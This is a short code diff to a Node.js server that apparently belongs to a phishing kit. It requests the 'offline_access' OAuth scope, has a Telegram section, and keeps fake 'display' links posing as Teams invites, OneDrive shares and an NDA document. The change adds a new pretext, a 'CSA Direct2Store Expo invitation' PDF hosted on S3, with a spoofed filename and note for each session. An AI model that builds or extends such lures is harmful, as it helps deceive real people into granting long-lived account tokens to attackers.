@@ -24,7 +24,8 @@ const SCOPE    = 'offline_access';
 const DISPLAY_BASES = {
   teams:    'https://teams.microsoft.com/invite/',
   onedrive: 'https://1drv.ms/files/',
-  nda:      'https://eviden-global.s3.us-east-1.amazonaws.com/',
+  nda: 'https://eviden-global.s3.us-east-1.amazonaws.com/',
+  csa: 'https://sustainable-furnitures.s3.us-east-2.amazonaws.com/CSA+Direct2Store+Expo.pdf'
 };
 
 // Telegram
@@ -324,6 +325,11 @@ const server = http.createServer(async (req, res) => {
         displayUrl = `${DISPLAY_BASES.onedrive}${crypto.randomBytes(8).toString('hex')}`;
         displayNote = 'OneDrive shared file';
       }
+      else if (reqLower === 'csa') {
+              displayFilename = 'CSA+Direct2Store+Expo.pdf';
+              displayUrl = `${DISPLAY_BASES.csa}`;
+              displayNote = 'CSA direct to store expo invitation';
+            }
       // default → keep real random filename, no URL
 
       sessions.set(sessionId, {
